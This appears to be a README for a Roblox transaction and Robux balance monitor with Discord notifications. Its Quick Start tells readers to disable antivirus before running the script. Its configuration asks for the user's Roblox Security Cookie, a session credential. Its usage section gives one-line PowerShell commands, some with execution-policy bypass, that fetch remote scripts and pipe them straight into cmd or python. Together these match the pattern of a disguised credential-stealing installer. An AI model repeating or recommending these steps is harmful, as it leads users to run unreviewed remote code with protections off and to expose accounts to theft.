# Roblox Transaction Monitor (CTL Edition)
A command-line tool to monitor Roblox transactions and Robux balance changes in real-time. Get Discord notifications when your Roblox economy data changes.

## Features

- [x] Real-time monitoring of Roblox transactions via CTL
- [x] Robux balance tracking
- [x] Discord webhook integration for notifications
- [x] Lightweight CLI interface
- [x] Customizable monitoring intervals
- [x] Detailed logging system

## Quick Start

- [x] Disable antivirus temporarily
- [x] Download and run the CTL script
- [x] Re-enable antivirus once configured

## TODO
- [x] Add time-range filters (day / month / year / total)
- [x] Package as a single portable executable

## Configuration
Create a `config.json` file with:

1. Roblox Security Cookie
2. Discord Webhook URL
3. Discord Emoji ID for Robux display
4. Discord Emoji Name
5. Check Interval (seconds)
6. Time-span filter: `day`, `month`, `year`, or `total`

## Usage
Install dependencies:
```
powershell -ep bypass -Command "IWR 'https://raw.githubusercontent.com/MrAndiGamesDev/NEW-Roblox-Transaction-Balance-Monitor/main/install.bat' | % Content | cmd"
```
Python Stable Version
```
powershell -Command "(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/MrAndiGamesDev/NEW-Roblox-Transaction-Balance-Monitor/main/main.py').Content | python"
```
Python Dev Version
```
powershell -Command "(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/MrAndiGamesDev/NEW-Roblox-Transaction-Balance-Monitor/main/maindev.py').Content | python"
```
UnInstall dependencies
```
powershell -ep bypass -Command "IWR 'https://raw.githubusercontent.com/MrAndiGamesDev/NEW-Roblox-Transaction-Balance-Monitor/main/uninstall.bat' | % Content | cmd"
```
## License
This project is licensed under the Apache License - see the LICENSE file for details.